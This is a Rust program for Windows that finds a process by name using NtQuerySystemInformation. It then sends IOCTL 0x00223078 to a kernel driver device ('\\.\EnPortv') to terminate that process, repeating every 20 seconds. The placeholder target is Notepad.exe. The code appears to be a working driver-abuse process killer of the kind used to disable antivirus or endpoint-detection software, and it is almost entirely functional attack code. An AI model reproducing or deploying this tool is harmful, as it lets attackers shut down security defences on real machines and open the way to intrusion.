use std::{
    ffi::OsStr,
    os::{raw::c_void, windows::ffi::OsStrExt},
    ptr::null_mut,
    time::Duration,
    vec,
};

use windows_sys::{
    Wdk::System::SystemInformation::{NtQuerySystemInformation, SystemProcessInformation},
    Win32::{
        Foundation::{
            GENERIC_READ, GENERIC_WRITE, INVALID_HANDLE_VALUE, STATUS_INFO_LENGTH_MISMATCH,
        },
        Storage::FileSystem::{CreateFileW, OPEN_EXISTING},
        System::{IO::DeviceIoControl, WindowsProgramming::SYSTEM_PROCESS_INFORMATION},
    },
};

#[allow(non_snake_case)]
fn NT_SUCCESS(Status: i32) -> bool {
    Status >= 0
}

fn get_pid(proc_name: &str) -> u32 {
    let mut pid: u32 = 0;
    unsafe {
        let mut return_length: u32 = 0;
        let status =
            NtQuerySystemInformation(SystemProcessInformation, null_mut(), 0, &mut return_length);

        if status != STATUS_INFO_LENGTH_MISMATCH {
            println!("[-] NtQuerySystemInformation failed.");
            return pid;
        }

        let buffer_size = return_length as usize;
        let buffer: Vec<u8> = vec![0; buffer_size];

        let status = NtQuerySystemInformation(
            SystemProcessInformation,
            buffer.as_ptr() as *mut c_void,
            buffer_size as u32,
            &mut return_length,
        );

        if !NT_SUCCESS(status) {
            println!("[-] NtQuerySystemInformation failed.");
            return pid;
        }

        let mut proc_info = buffer.as_ptr() as *const SYSTEM_PROCESS_INFORMATION;

        loop {
            if !(*proc_info).ImageName.Buffer.is_null()
                && proc_name.eq_ignore_ascii_case(
                    &String::from_utf16_lossy(std::slice::from_raw_parts(
                        (*proc_info).ImageName.Buffer,
                        (*proc_info).ImageName.Length as usize / 2,
                    ))
                    .to_string(),
                )
            {
                pid = (*proc_info).UniqueProcessId as u32;
                break;
            }

            if (*proc_info).NextEntryOffset == 0 {
                break;
            }

            proc_info = (proc_info as *const u8).add((*proc_info).NextEntryOffset as usize)
                as *const SYSTEM_PROCESS_INFORMATION;
        }
    }

    pid
}

fn to_wstring(s: &str) -> Vec<u16> {
    OsStr::new(s)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect()
}

fn kill_pid(pid: u32) -> bool {
    unsafe {
        let ioctl = 0x00223078;

        let device_path = "\\\\.\\EnPortv";

        let device_handle = CreateFileW(
            to_wstring(device_path).as_ptr(),
            GENERIC_READ | GENERIC_WRITE,
            0,
            null_mut(),
            OPEN_EXISTING,
            0,
            null_mut(),
        );

        if device_handle == INVALID_HANDLE_VALUE {
            println!("[-] Failed to open device handle.");
            return false;
        }

        println!("[+] Device handle {:?}", device_handle);

        let mut buffer = vec![0u8; 0x10];
        let self_pid = std::process::id();
        buffer[0..4].copy_from_slice(&self_pid.to_ne_bytes());
        buffer[8..12].copy_from_slice(&pid.to_ne_bytes());

        if DeviceIoControl(
            device_handle,
            ioctl,
            buffer.as_mut_ptr() as *mut c_void,
            buffer.len() as u32,
            null_mut(),
            4,
            null_mut(),
            null_mut(),
        ) == 0
        {
            println!("[-] DeviceIoControl failed.");
            return false;
        }

        println!("[+] Process with PID {} terminated.", pid);
        true
    }
}

fn main() {
    let mut proc_names: Vec<String> = Vec::new();
    proc_names.push("Notepad.exe".to_string());

    loop {
        for proc_name in &proc_names {
            let pid = get_pid(proc_name);
            if pid == 0 {
                println!("[-] Process {} not found.", proc_name);
                continue;
            }
            println!("Process name: {}, PID: {}", proc_name, pid);
            kill_pid(pid);
        }
        std::thread::sleep(Duration::from_secs(20));
    }
}
